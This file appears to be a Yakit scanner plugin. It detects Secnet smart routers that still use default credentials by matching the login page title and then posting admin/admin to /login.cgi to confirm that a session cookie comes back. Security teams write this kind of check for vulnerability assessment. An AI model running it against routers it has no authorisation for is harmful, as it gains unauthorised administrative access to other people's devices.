yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="secnet ac default password 漏洞"
    severity="未填写"
    type="漏洞"

    poc_url_uc1= url + `/login.html`
    req_uc1, _ := http.NewRequest("GET",poc_url_uc1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_uc1)
    resp_uc1, err := http.Do(req_uc1)
    die(err)
    bresp,_=http.dump(resp_uc1)
    header, body = poc.Split(bresp)
    uc1_flag = false
    if resp_uc1.StatusCode == 200 && str.Contains(string(body),"<title>安网科技-智能路由系统</title>"){
        uc1_flag = true
    }

    poc_url_uc2= url + `/login.cgi`
    req_uc2, _ := http.NewRequest("POST",poc_url_uc2,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.body(`user=admin&password=admin`),)
    breq,_=http.dump(req_uc2)
    resp_uc2, err := http.Do(req_uc2)
    die(err)
    bresp,_=http.dump(resp_uc2)
    header, body = poc.Split(bresp)
    uc2_flag = false
    if resp_uc2.StatusCode == 200 && str.Contains(string(header),"ac_userid=admin,ac_passwd=") && str.Contains(string(body),"window.open('index.htm?_"){
        uc2_flag = true
    }

    poc_url=poc_url_uc2
    if uc1_flag && uc2_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
